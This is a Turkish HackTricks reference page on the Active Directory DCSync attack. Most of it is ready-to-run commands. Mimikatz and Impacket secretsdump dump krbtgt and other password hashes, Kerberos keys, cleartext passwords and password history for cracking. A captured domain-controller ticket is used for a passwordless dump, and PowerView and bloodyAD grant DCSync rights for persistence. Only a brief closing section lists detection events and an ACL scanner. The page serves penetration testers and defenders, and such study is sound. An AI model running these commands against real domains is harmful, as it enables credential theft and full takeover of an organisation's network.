# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** iznine sahip olmak, etki alanının kendisi üzerinde şu izinlere sahip olunduğu anlamına gelir: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** ve **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**DCSync hakkında önemli notlar:**

- **DCSync attack, bir Domain Controller davranışını simüle eder ve Directory Replication Service Remote Protocol (MS-DRSR) kullanarak diğer Domain Controller'lardan bilgileri replicate etmelerini ister.** MS-DRSR, Active Directory'nin geçerli ve gerekli bir işlevi olduğundan kapatılamaz veya devre dışı bırakılamaz.
- Varsayılan olarak yalnızca **Domain Admins, Enterprise Admins, Administrators ve Domain Controllers** grupları gerekli ayrıcalıklara sahiptir.
- Uygulamada **full DCSync**, etki alanı adlandırma bağlamı üzerinde **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** izinlerini gerektirir. `DS-Replication-Get-Changes-In-Filtered-Set` genellikle bunlarla birlikte delege edilir; ancak tek başına, full krbtgt dump işleminden ziyade **confidential / RODC-filtered attributes** (örneğin eski LAPS-style secrets) senkronizasyonuyla daha fazla ilgilidir.<sup>[[2]](#references)</sup>
- Herhangi bir hesap parolası reversible encryption kullanılarak depolanıyorsa, Mimikatz'ta parolayı clear text olarak döndürmek için bir seçenek bulunur.

### Enumeration

`powerview` kullanarak bu izinlere kimlerin sahip olduğunu kontrol edin:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
DCSync haklarına sahip **varsayılan olmayan güvenlik sorumlularına** odaklanmak istiyorsanız, yerleşik replication-capable grupları filtreleyin ve yalnızca beklenmeyen yetki sahiplerini inceleyin:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Yerel Olarak Exploit Et
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Uzaktan Exploit Gerçekleştir
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Pratik kapsam dahilindeki örnekler:<sup>[[1]](#references)</sup>
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### Yakalanmış bir DC makine TGT'si (ccache) kullanarak DCSync

unconstrained-delegation export-mode senaryolarında, bir Domain Controller makine TGT'si (örneğin `krbtgt@DOMAIN` için `DC1$@DOMAIN`) yakalayabilirsiniz. Daha sonra bu ccache'i, parola olmadan DC olarak kimlik doğrulamak ve DCSync gerçekleştirmek için kullanabilirsiniz.<sup>[[5]](#references)</sup>
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Operasyonel notlar:

- **Impacket's Kerberos path touches SMB first** before the DRSUAPI call. If the environment enforces **SPN target name validation**, a full dump may fail with `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- In that case, either request a **`cifs/<dc>`** service ticket for the target DC first or fall back to **`-just-dc-user`** for the account you need immediately.
- When you only have lower replication rights, LDAP/DirSync-style syncing can still expose **confidential** or **RODC-filtered** attributes (for example legacy `ms-Mcs-AdmPwd`) without a full krbtgt replication.<sup>[[2]](#references)</sup>

`-just-dc` 3 dosya oluşturur:

- **NTLM hashes** içeren bir dosya
- **Kerberos keys** içeren bir dosya
- [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmiş hesaplar için NTDS'den alınan cleartext passwords içeren bir dosya. Reversible encryption kullanan kullanıcıları şu komutla bulabilirsiniz:

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

Bir domain admin iseniz, `powerview` yardımıyla bu izinleri herhangi bir kullanıcıya verebilirsiniz:<sup>[[3]](#references)</sup>
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Linux operatörleri bunu `bloodyAD` ile de yapabilir:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Ardından, (ayrıcalıkların adlarını "ObjectType" alanında görebilmeniz gerekir) çıktıda 3 ayrıcalığın kullanıcıya **doğru şekilde atanıp atanmadığını kontrol edebilirsiniz**:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Azaltma

- Security Event ID 4662 (Nesne için denetim ilkesi etkinleştirilmelidir) – Bir nesne üzerinde işlem gerçekleştirildi<sup>[[4]](#references)</sup>
- Security Event ID 5136 (Nesne için denetim ilkesi etkinleştirilmelidir) – Bir dizin hizmeti nesnesi değiştirildi
- Security Event ID 4670 (Nesne için denetim ilkesi etkinleştirilmelidir) – Bir nesne üzerindeki izinler değiştirildi
- AD ACL Scanner - ACL'lerin raporlarını oluşturun ve karşılaştırın. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket ChangeLog](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Leveraging Replication Get-Changes and Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Dump Password Hashes from Domain Controller](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
